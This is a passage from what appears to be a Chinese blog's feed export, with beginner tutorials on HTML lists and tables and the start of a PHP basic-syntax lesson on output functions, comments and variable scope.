<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/09/5c8320e82a362.jpg&quot;</span>&gt;</span><br><span class="line">  &lt;ol type=<span class="string">&quot;1&quot;</span> start=<span class="string">&quot;1&quot;</span>&gt;          &lt;!--有序列表开始--&gt;</span><br><span class="line">    &lt;li&gt;哈哈，这里是第一条有序列表&lt;/li&gt;</span><br><span class="line">  </span><br><span class="line">     &lt;ul type=<span class="string">&quot;circle&quot;</span>&gt;            &lt;!--无序列表开始--&gt;</span><br><span class="line">          &lt;li&gt;这里是第一条无序列表&lt;/li&gt;   </span><br><span class="line">          &lt;li&gt;这里是第二条无序列表&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;                         &lt;!--无序列表结束--&gt;</span><br><span class="line">    </span><br><span class="line">     &lt;ul type=<span class="string">&quot;disc&quot;</span>&gt;</span><br><span class="line">          &lt;li&gt;这里是第三条无序列表&lt;/li&gt;   </span><br><span class="line">          &lt;li&gt;这里是第四条无序列表&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">  &lt;br&gt;  </span><br><span class="line">  &lt;li&gt;哈哈，这里是第二条有序列表&lt;/li&gt;</span><br><span class="line">  </span><br><span class="line">     &lt;ul type=<span class="string">&quot;square&quot;</span>&gt;</span><br><span class="line">          &lt;li&gt;这里是第五条无序列表&lt;/li&gt;   </span><br><span class="line">          &lt;li&gt;这里是第六条无序列表&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;  </span><br><span class="line">  &lt;/ol&gt;                             &lt;!--有序列表结束--&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;ol type=<span class="string">&quot;a&quot;</span> start=<span class="string">&quot;a&quot;</span>&gt;</span><br><span class="line">     &lt;li&gt;哈哈，这里是第三条有序列表&lt;/li&gt;</span><br><span class="line">   &lt;br&gt;</span><br><span class="line">     &lt;li&gt;哈哈，这里是第四条有序列表&lt;/li&gt;</span><br><span class="line">  &lt;/ol&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;dl&gt;</span><br><span class="line">            &lt;dt&gt;我是第一个自定义列表的列表项&lt;/dt&gt;</span><br><span class="line">                &lt;dd&gt;我是第一个自定义列表的列表项的描述&lt;/dd&gt;          </span><br><span class="line">  &lt;/dl&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c832ded3bac1.png" alt="7.png"></p>
<p>可参读博文：<font color="#00B2EE">《<a href="https://www.cnblogs.com/yyhh/p/4208951.html">HTML表格与列表</a>》</font> </p>
<br>

<br>

<h3 id="四-HTML-表格"><a href="#四-HTML-表格" class="headerlink" title="四. HTML 表格"></a><font color="#FF6347" face="Comic sans MS">四. HTML 表格</font></h3><p><font color="#00B2EE" face="Microsoft YaHei"><strong>一、表格</strong></font></p>
<p>网页中有类似word里面的功能，当然，也会有类似excel里面的功能，表格就是其中之一。</p>
<p>表格由 <code>&lt;table&gt;</code> 标签来定义。每个表格均有若干行（由 <code>&lt;tr&gt;</code> 标签定义），每行被分割为若干单元格（由 <code>&lt;td&gt;</code> 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。</p>
<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、表格的结构</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;table&gt;                         &lt;!--定义表格--&gt;</span><br><span class="line"></span><br><span class="line">        &lt;tr&gt;                    &lt;!--定义一行--&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/th&gt;       &lt;!--定义一个标题单元格--&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/th&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/th&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/&lt;th&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;       &lt;!--定义一个单元格--&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<br>

<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、表格标签及属性</strong></font></p>
<p><strong>注：</strong>属性是区分大小写的，bgColor如果写成bgcolor是没有效果的</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;table&gt;&lt;/table&gt;</code></strong> 表，----&gt;可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>Width</code>**：表格宽度，单位可以是百分比，也可以是固定值。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Height</code>**：表格高度。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Align</code>**：表格水平对齐方式（<font color="#FF7F00">不赞成使用该属性</font>），取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> left</li>
<li><input disabled="" type="checkbox"> center</li>
<li><input disabled="" type="checkbox"> right</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Border</code>**：边框粗细。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Bordercolor</code>**：边框颜色。取值：rgb(x,x,x)、#xxxxxx、colorname</li>
<li><input disabled="" type="checkbox"> **<code>bgColor</code>**：表格背景色（<font color="#FF7F00">不赞成使用该属性</font>）。取值： rgb(x,x,x)、#xxxxxx、colorname</li>
<li><input disabled="" type="checkbox"> **<code>background</code>**：背景图片，取值：URL</li>
<li><input disabled="" type="checkbox"> **<code>cellpadding</code>**：单元格边线到内容间的距离(填充距离)。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong><code>cellspacing</code>**：单元格与单元格之间的距离(间距)，默认是双线</strong>，这个很重要**<br>取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong><code>rules</code>**：合并单元格边框线，取值：all。</strong>注意：**rules兼容性不好，请使用CSS来取代它。</li>
<li><input disabled="" type="checkbox"> **<code>summary</code>**：摘要，使搜索引擎更好的读懂表格内容，更好的帮助特殊用户读取表格内容。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> text</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;caption&gt;&lt;/caption&gt;</code>**：定义表格标题。可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>Align</code>**：表格水平对齐方式（<font color="#FF7F00">不赞成使用该属性</font>），取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> left</li>
<li><input disabled="" type="checkbox"> top</li>
<li><input disabled="" type="checkbox"> rightbottom</li>
<li><input disabled="" type="checkbox"> bottom</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;tr&gt;&lt;/tr&gt;</code>**：行标记。可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>bgColor</code>**：行的背景色。取值： rgb(x,x,x)、#xxxxxx、colorname</li>
<li><input disabled="" type="checkbox"> **<code>Height</code>**：行高度。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Align</code>**：表格内容对齐方式。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> left</li>
<li><input disabled="" type="checkbox"> center</li>
<li><input disabled="" type="checkbox"> right</li>
<li><input disabled="" type="checkbox"> justify</li>
<li><input disabled="" type="checkbox"> char</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>valign</code>**：属性趋向于垂直对齐，其值包含：top、bottom、middle、baseline</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;th&gt;&lt;/th&gt;</code>**：标题单元格（每列第一行），居中加粗显示。</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;td&gt;&lt;/td&gt;</code>**：普通单元格。<code>&lt;th&gt;</code>和<code>&lt;td&gt;</code>可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>height</code>**：单元格高度</li>
<li><input disabled="" type="checkbox"> **<code>width</code>**：单元格宽度</li>
<li><input disabled="" type="checkbox"> **<code>bgColor</code>**：单元格背景色</li>
<li><input disabled="" type="checkbox"> **<code>background</code>**：单元格背景图片</li>
<li><input disabled="" type="checkbox"> **<code>align</code>**：水平对齐</li>
<li><input disabled="" type="checkbox"> **<code>valign</code>**：垂直水齐</li>
<li><input disabled="" type="checkbox"> <strong><code>rowspan</code>**：<font color="#FF7F00">**上下单元格合并。合并属性必须放在第一个单元格中。</strong></font></li>
<li><input disabled="" type="checkbox"> <strong><code>colspan</code>**：<font color="#FF7F00">**左右单元格合并。合并时，有增就得有减，要保证每一行单元格的个数不变。</strong></font></li>
</ul>
</li>
</ul>
<br>

<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>三、表格标签示例</strong></font></p>
<ol>
<li><code>&lt;table&gt;、&lt;tr&gt;、&lt;th&gt;、&lt;td&gt;</code>示例：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">     &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;300&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">            cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;th&gt;工号&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;姓名&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;职位&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">001</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小明&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;设计师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">002</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小方&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;工程师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">003</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小白&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;程序员&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">     &lt;/table&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c836d74b4ebb.png" alt="8.png"></p>
<br>

<br>

<ol start="2">
<li><code>&lt;caption&gt;&lt;/caption&gt;</code>表格标题示例：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">     &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;300&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">            cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">         &lt;caption&gt;<span class="number">2019.3</span>月日历&lt;/caption&gt;   &lt;!--放在&lt;table&gt;&lt;/table&gt;中间--&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;th&gt;工号&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;姓名&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;职位&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">001</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小明&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;设计师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">002</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小方&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;工程师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">003</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小白&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;程序员&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">     &lt;/table&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c836e941fa2e.png" alt="10.png"></p>
<br>

<br>

<ol start="3">
<li>空表格、跨行或者跨列表格示例：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;table&gt;   &lt;!--建立空表，无属性--&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">         &lt;td&gt;zdd&lt;/td&gt;</span><br><span class="line">         &lt;td&gt;<span class="number">30</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">         &lt;td&gt;ddz&lt;/td&gt;</span><br><span class="line">         &lt;td&gt;<span class="number">27</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">   &lt;/table&gt;</span><br><span class="line">  </span><br><span class="line">&lt;br&gt;         &lt;!--合并左右单元格--&gt;</span><br><span class="line">     &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;400&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">            cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">        &lt;th colspan=<span class="string">&quot;2&quot;</span>&gt;电话&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;Bill Gates&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">854</span>&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">855</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">     &lt;/table&gt; </span><br><span class="line">   </span><br><span class="line">&lt;br&gt;         &lt;!--合并上下单元格--&gt;</span><br><span class="line">   &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;400&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">          cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">      </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">        &lt;td&gt;Bill Gates&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th rowspan=<span class="string">&quot;2&quot;</span>&gt;电话&lt;/th&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">854</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">855</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;/table&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c83737340e28.png" alt="11.png"></p>
<br>

<br>

<h3 id="五-HTML-表单"><a href="#五-HTML-表单" class="headerlink" title="五. HTML 表单"></a><font color="#FF6347" face="Comic sans MS">五. HTML 表单</font></h3><br>

<p>表单很简单，在HTML里它就是用来人与服务器的交互，或者说是HTML的输入输出交互的重要功能！</p>
<p>表单后续有时间再详细叙述吧，或者可以看在本站博文就有开始使用了….<font color="#00B2EE">《<a href="https://directoree.top/post/PHP-MySQL">PHP操作MySQL数据库</a>》</font></p>
<br />

<br />

<h3 id="六-CSS"><a href="#六-CSS" class="headerlink" title="六. CSS"></a><font color="#FF6347" face="Comic sans MS">六. CSS</font></h3><p><font color="#00B2EE">《<a href="https://directoree.github.io/post/HTML-CSS">CSS 基础</a>》</font></p>
<p>本文参考：<br><font color="#00B2EE">《<a href="http://www.php.cn/code/570.html">html/css快速入门</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/665.html">HTML+CSS基础入门教程</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/24737.html">HTML极速入门(2018版)</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/5007.html">弹指间学会HTML视频教程</a>》</font></p>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP基础语法</title>
    <url>/post/PHP-1/</url>
    <content><![CDATA[<p>年後の新作2.14(。・∀・)ノ   </p>
<p>本文参考PHP中文网：<font color="#00B2EE">[<a href="http://www.php.cn/code/4800.html">PHP入门教程之一周学会PHP</a>]</font>&emsp;<font color="#00B2EE">[<a href="http://www.php.cn/code/4760.html">PHP入门视频教程之一周学会PHP</a>]</font><br>资料查阅：<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_string.asp">W3shcool PHP 教程</a>]</font><br>&emsp;<br>&emsp;</p>
<a id="more"></a>

<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP</font></center>




<p>&emsp;</p>
<h3 id="一、-PHP基础语法"><a href="#一、-PHP基础语法" class="headerlink" title="一、 PHP基础语法"></a><font color="#FF6347" face="Comic sans MS">一、 PHP基础语法</font></h3><h4 id="1-1-PHP-语法"><a href="#1-1-PHP-语法" class="headerlink" title="1.1 PHP 语法"></a><font color="#3CB371" face="Comic sans MS">1.1 PHP 语法</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP基础语法</strong></font><br>PHP 脚本可以放在文档中的任何位置。<br>PHP 脚本以 尖括号、问号、PHP <font color="#00B2EE"><strong>&lt;?php**</font>开始，以 <font color="#00B2EE"></strong>?&gt;<strong></font> 问号、尖括号结束。<br>PHP 文件的默认文件扩展名是 “<font color="#00B2EE"></strong>.php**</font>“。<br>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">     //这里是我们要写的PHP代码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><br><font color="red"><strong>2. PHP输出语法</strong></font><br>PHP中<font color="#00B2EE"><strong>echo(), print(), print_r(), var_dump()</strong></font>的区别：<br><font color="#00B2EE"><strong>echo：</strong></font>是PHP语句, 输出一个或多个字符串。实际上它并不是一个函数，所以不必对它使用括号，直接用echo就行。print和print_r是函数,语句没有返回值,函数可以有返回值(即便没有用)。可以一次输出多个值，多个值之间用逗号分隔。echo是语言结构(language construct)，而并不是真正的函数，因此不能作为表达式的一部分使用。</p>
<p><font color="#00B2EE"><strong>print：</strong></font> 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。只能打印出简单类型变量的值，如：int、string。<br>下面的实例演示了如何使用 print 命令输出字符串（字符串可以包含 HTML 标签）：</p>
<p><font color="#00B2EE"><strong>print_r()：</strong></font><br>可以把字符串和数字简单地打印出来，而数组则以括起来的键和值得列表形式显示，并以Array开头。但print_r()输出布尔值和NULL的结果没有意义，因为都是打印”\n”。因此用var_dump()函数更适合调试。</p>
<p><font color="#00B2EE"><strong>var_dump()：</strong></font><br>var_dump(传入一个变量) 输出变类型和值（最常用）。var_dump() 是一个函数。向括号()中间插入变量。这个函数，会打印出来数据类型，还会对应显示变量的长度和值。<br></font></p>
<blockquote>
<blockquote>
<p>·  echo - 可以输出一个或多个字符串<br>·  print - 只允许输出一个字符串，返回值总为 1<br>提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。<br>echo 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。</p>
</blockquote>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span>:</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：hello world!abc</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>:</span><br><span class="line">&lt;?php</span><br><span class="line"> <span class="built_in">print</span> <span class="string">&quot;&lt;h2&gt;PHP is fun!&lt;/h2&gt;&quot;</span>;</span><br><span class="line"> <span class="built_in">print</span> <span class="string">&quot;Hello world!&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="built_in">print</span> <span class="string">&quot;I&#x27;m about to learn PHP!&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> ?&gt;</span><br><span class="line"></span><br><span class="line">print_r()：</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$age</span>=array(18,20,24);</span><br><span class="line">    print_r(<span class="variable">$age</span>);</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：Array ( [0] =&gt; 18 [1] =&gt; 20 [2] =&gt; 24 )</span><br><span class="line"></span><br><span class="line">var_dump():</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$age</span>=array(18,20,24);</span><br><span class="line">    var_dump(<span class="variable">$age</span>);</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：array(3) &#123; [0]=&gt; int(18) [1]=&gt; int(20) [2]=&gt; int(24) &#125;</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**注意事项：**</font> 
php的代码部份全部要用半角的英文、很多人容易写成全角的英文和符号造成PHP代码报错。
PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。
PHP代码的最后一行可以加也可不加分号。由于很多学习者特别是初学者经常犯一个毛病：写完一行代码不加
分号。因此，容易报错。我们通常在公司里面规定：一行代码写完，就必须要加分号。
</font></td></tr></table>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3.PHP中的注释：</strong></font><br><font color="#00B2EE"><strong>单行注释（只注释一行）：</strong></font> <font color="#FF7F00">//</font> 双斜杠表示单行注释,有时也用 # 表示,但用的比较少，多用 <font color="#FF7F00">//</font><br><font color="#00B2EE"><strong>多行注释（注释多行）：</strong></font> 以 <font color="#FF7F00">/* </font> 开始, 以<font color="#FF7F00">*/</font>结束代表多行注释。<br></font> </p>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-2-PHP-变量"><a href="#1-2-PHP-变量" class="headerlink" title="1.2 PHP 变量"></a><font color="#3CB371" face="Comic sans MS">1.2 PHP 变量</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP中的变量有几个特点：</strong></font></p>
<ol>
<li>必须要以<font color="#FF7F00">$</font>开始。如变量x必须要写成<font color="#FF7F00">$x</font></li>
<li>变量的首字母不能以数字开始</li>
<li>变量的名字区分大小写</li>
<li>变量不要用特殊符号、中文，_不算特殊符号</li>
<li>变量命名要有意义（别写xxx，aaa，ccc这种 变量名）</li>
<li>$ 叫作美元符，英文单词：dollar。PHP的变量必须以美元符开始。说明搞PHP有“钱”图</font> 

</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">变量在您第一次赋值给它的时候被创建：在下面的语句执行中，变量txt将保</span><br><span class="line">存值Hello world!，且变量 x 将保存值 5。</span><br><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$txt</span>=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"> <span class="variable">$x</span>=5;</span><br><span class="line"> <span class="variable">$y</span>=10.5;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. PHP是一门弱类型语言：</strong></font><br>在上面的实例中，我们注意到，不必向 PHP 声明该变量的数据类型。<br>PHP 会根据变量的值，自动把变量转换为正确的数据类型。<br>在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。<br></font></p>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. PHP变量的作用域：</strong></font><font color="#00B2EE"><strong>local、global、static、parameter</strong></font><br><font color="#00B2EE"><strong>局部和全局作用域（loacal  global）：</strong></font>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</p>
<p><font color="#00B2EE"><strong>PHP global 关键字：</strong></font>global 关键字用于函数内访问全局变量。<br>PHP 将所有全局变量存储在一个名为 $GLOBALS[index] 的数组中。 index 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$x</span>=10;</span><br><span class="line"> <span class="variable">$y</span>=20;</span><br><span class="line"> <span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">     global <span class="variable">$x</span>,<span class="variable">$y</span>;      //使用global关键字</span><br><span class="line"> </span><br><span class="line">     <span class="variable">$y</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">test</span>();</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$y</span>;//输出30</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">上面例子也可以写成：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$x</span>=5;</span><br><span class="line"> <span class="variable">$y</span>=10;</span><br><span class="line"> <span class="keyword">function</span> myTest()</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="variable">$GLOBALS</span>[<span 